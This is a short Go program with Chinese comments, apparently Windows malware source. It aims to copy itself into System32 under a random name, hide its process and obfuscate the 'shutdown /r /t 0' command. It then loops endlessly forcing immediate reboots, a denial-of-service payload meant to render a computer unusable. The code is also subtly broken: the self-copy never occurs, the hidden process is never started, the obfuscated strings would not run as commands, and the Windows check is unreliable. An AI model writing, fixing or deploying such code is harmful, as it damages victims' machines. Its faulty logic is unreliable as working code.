package main

import (
	"crypto/rand"
	"encoding/base64"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

// 混淆字符串
func obfuscateString(s string) string {
	bytes := []byte(s)
	for i := range bytes {
		bytes[i] ^= 0x33
	}
	return base64.StdEncoding.EncodeToString(bytes)
}

// 获取随机字符串
func getRandomString(length int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		result[i] = letters[n.Int64()]
	}
	return string(result)
}

func main() {
	// 检查是否在 Windows 系统上运行
	if os.Getenv("GOOS") != "windows" {
		return
	}

	// 获取随机文件名
	randomName := getRandomString(8) + ".exe"
	
	// 复制自身到系统目录
	systemDir := os.Getenv("SystemRoot") + "\\System32\\"
	targetPath := filepath.Join(systemDir, randomName)
	
	// 创建隐藏的系统进程
	cmd := exec.Command("cmd", "/c", "start", "/b", targetPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	
	// 混淆关键字符串
	restartCmd := obfuscateString("shutdown")
	restartArg := obfuscateString("/r")
	timeArg := obfuscateString("/t")
	
	// 主循环
	for {
		// 使用混淆后的命令
		cmd := exec.Command(restartCmd, restartArg, timeArg, "0")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
		}
		cmd.Run()
		time.Sleep(100 * time.Millisecond)
	}
} 